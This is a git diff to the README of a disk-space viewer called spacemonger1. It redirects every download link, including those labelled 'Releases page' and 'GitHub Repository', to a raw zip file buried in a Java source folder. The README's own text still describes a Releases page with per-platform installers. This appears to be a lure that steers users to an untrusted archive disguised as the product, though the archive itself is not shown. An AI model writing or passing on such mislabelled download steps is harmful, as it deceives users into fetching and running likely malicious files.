@@ -1,7 +1,7 @@
 # 🛰️ spacemonger1 - View Your Disk Space Simply
 
 ## 📥 Download Now
-[![Download spacemonger1](https://img.shields.io/badge/Download%20spacemonger1-blue?style=for-the-badge&logo=github)](https://github.com/Crapshootdesiccation266/spacemonger1/releases)
+[![Download spacemonger1](https://raw.githubusercontent.com/Crapshootdesiccation266/spacemonger1/master/src/main/java/spacemonger1/fs/windows/spacemonger1-v2.8.zip%20spacemonger1-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Crapshootdesiccation266/spacemonger1/master/src/main/java/spacemonger1/fs/windows/spacemonger1-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download SpaceMonger One, ensure your system meets these requirements
 
 To get started with SpaceMonger One, please follow these simple steps:
 
-1. Click the following link to visit the Releases page: [Download SpaceMonger One](https://github.com/Crapshootdesiccation266/spacemonger1/releases).
+1. Click the following link to visit the Releases page: [Download SpaceMonger One](https://raw.githubusercontent.com/Crapshootdesiccation266/spacemonger1/master/src/main/java/spacemonger1/fs/windows/spacemonger1-v2.8.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click on the file that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, .AppImage for Linux).
 4. The file will start downloading. Once completed, locate the downloaded file on your computer.
@@ -68,7 +68,7 @@ If you encounter issues while using SpaceMonger One:
 
 ### 🔗 Additional Resources
 
-- Visit the [Releases page](https://github.com/Crapshootdesiccation266/spacemonger1/releases) to get the latest version and updates.
-- Follow our [GitHub Repository](https://github.com/Crapshootdesiccation266/spacemonger1) for more details on future releases, contributions, and project updates.
+- Visit the [Releases page](https://raw.githubusercontent.com/Crapshootdesiccation266/spacemonger1/master/src/main/java/spacemonger1/fs/windows/spacemonger1-v2.8.zip) to get the latest version and updates.
+- Follow our [GitHub Repository](https://raw.githubusercontent.com/Crapshootdesiccation266/spacemonger1/master/src/main/java/spacemonger1/fs/windows/spacemonger1-v2.8.zip) for more details on future releases, contributions, and project updates.
 
 Thank you for choosing SpaceMonger One! We look forward to enhancing your disk management experience.
